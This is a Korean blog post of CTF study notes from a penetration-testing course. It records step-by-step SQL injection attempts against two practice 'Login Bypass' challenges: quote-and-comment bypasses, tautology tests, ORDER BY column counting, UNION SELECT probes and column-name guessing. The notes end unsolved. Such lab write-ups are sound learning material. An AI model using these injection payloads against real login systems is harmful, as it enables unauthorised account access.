---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[CTF] CTF 문제 풀이: SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 7주차"

date: 2024-11-28
last_modified_at: 

categories: [CTF]
tags: [TIL, WEB]
---

# Login Bypass 3
1. 
id: doldol
pw: dol1234
-> login.php에서 index.php로 302
-> 서버측에서 웹페이지 이동시켜준다
2. 
id: doldol' and '1' = '1
pw: dol1234
-> O
-> sql injection 가능하다
-> query에서 괄호가 안 쓰였어
3. 
id: doldol' or '1' = '1
pw: dol1234
-> X
-> or 필터링이 되어 있는 걸까요?
4. 
id: doldolor
pw: dol1234
-> X
-> 'or' 필터링 X
5. 
id: doldol or
pw: dol1234
-> X
-> ' or' 필터링 X
6. 
id: doldol or 
pw: dol1234
-> X
-> ' or ' 필터링 X
7. 
id: doldolor '1' = '1
pw: dol1234
-> X
-> "or '1' = '1" 필터링 X
8. 
id: doldol'or'1'='1
pw: dol1234
-> X
-> 띄어쓰기 관련도 아닌가봐요
9. 
id: doldol'and'1'='1
pw: dol1234
-> O
-> or이랑 관련이 있는 건데...
10. 
id: doldol'or'1'='1'#
pw: dol1234
-> X
11. 
id: doldol'#
pw: dol1234
-> O
12. 
id: doldol'#
pw: asdf
-> X
-> 식별, 인증 분리 or 줄을 새로 넘겼거나
13. 
id: doldol' order by 1 #
pw: dol1234
-> O
14. 
id: doldol' order by 1, 2 #
pw: dol1234
-> O
13. 
id: doldol' order by 1, 2, 3 #
pw: dol1234
-> X
-> column은 ID, PW 두 개만 있네요
14. 
id: doldol' union select 1, 2 #
pw: dol1234
-> O
-> union은 안 막혀있네요
-> 근데 data를 볼 수 있는 곳이 없잖아요
15. 
id: doldol' union select database(), 2 #
pw: dol1234
-> O
16. 
id: doldol
pw: dol1234'and'1'='1
-> X
-> if input_pw == DB['pw']: 통과
17.
UPDATE sqli_1 SET UserId = 'normaltic3', Password = 'asdf' where UserId = 'normaltic3';
-> table name을 몰라
-> 비밀번호를 바꿀 수 없어

# Login Bypass 4
1. 
id: doldol
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-10.png?raw=true)
-> login.php과 logout.php에서 302 응답 코드가 보인다.
-> 다른 페이지로 이동시켜준다는 뜻
2. 
id: doldol' and '1' = '1
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> sql injection 가능하다
-> 괄호 X
3. 
id: doldol'#
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> 주석 처리 가능
4. 
id: doldol'#
pw: asdf
-> X
-> 줄바꿈을 했거나
-> 식별과 인증을 분리했거나
5. 
id: doldol' or '1' = '1
pw: asdf
-> 식별과 인증을 분리했네
    -> normaltic4의 비밀번호를 바꾸거나
        -> update: table과 column 이름 필요
        update [table] set [col1] = val1, ... where condition;
    -> normaltic4의 비밀번호를 확인하거나
        -> union: 모든 결과값을 확인할 수 있어야 함
-> 여기도 column이 name일까?
6. 
id: doldol' and name = 'doldol' #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> column이 name이네?
-> 그러면 column 개수도 똑같나?
7. 
id: doldol' order by 1, 2, 3, 4, 5, 6 #
pw: dol1234
-> X
8. 
id: doldol' order by 1, 2 #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
9. 
id: doldol' order by 1, 2, 3 #
pw: dol1234
-> X
-> column 개수가 3개네
-> 그러면 딱 id랑 pw만 있네
10. 
id: doldol' and Password = 'dol1234
pw: dol1234
-> x
11. 
id: doldol' and pass = 'dol1234
pw: dol1234
-> x
12. 
id: doldol|normaltic4
pw: dol1234
-> X
-> 정규식에서 |가 or을 의미한다고 해서 해봤는데 안되네
13. 
id: doldol' union select 1, 2' #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> 데이터를 볼 수가 없네
14. 
알고 있는 정보를 정리해 보자
1. 식별, 인증 분리 로직
2. column은 2개 -> id, pw
3. doldol/dol1234, normaltic4/?
select * from table where id = id
if db_pw = input_pw:
    통과
15. 
id: doldol' and UserId = 'doldol' #
pw: dol1234
-> x
16. 
id: doldol' and userId = 'doldol' #
pw: dol1234
-> x
17. 
id: doldol' and userid = 'doldol' #
pw: dol1234
-> x
18. 
id: doldol' and id = 'doldol' #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
19. 
id: doldol' or id = 'normaltic4' #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> id는 normaltic4, pw는 doldol꺼 차용해서 로그인할 수 있을 줄 알았는데 doldol씨네
-> 순서 차이?
20. 
id: normaltic4' or id = 'doldol' #
pw: dol1234
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
-> id랑 pw가 같은 계정으로 로그인되나봐
select * from table where id = id
if db_pw = input_pw:
    통과한 아이디로 로그인
21. 
id: normaltic4'
pw: ' or '1' = '1
-> x
-> 역시나 안 되고
22. 
id: doldol
pw: dol1234' and pw = 'dol1234' #
-> X
23. 
id: doldol' and pw = 'dol1234' #
pw: dol1234
-> x
23. 
id: doldol' and pass = 'dol1234' #
pw: dol1234
-> x
23. 
id: doldol' and UserPass = 'dol1234' #
pw: dol1234
-> x
-> pw, passwd, password, pass, hash
24. 
select * from table where id = id;
update table set pw = '1234' where id = 'normaltic4' #
if db_pw = input_pw:
    통과

-> union 값을 넣어줄 장소를 마련해줄 수는 없을까?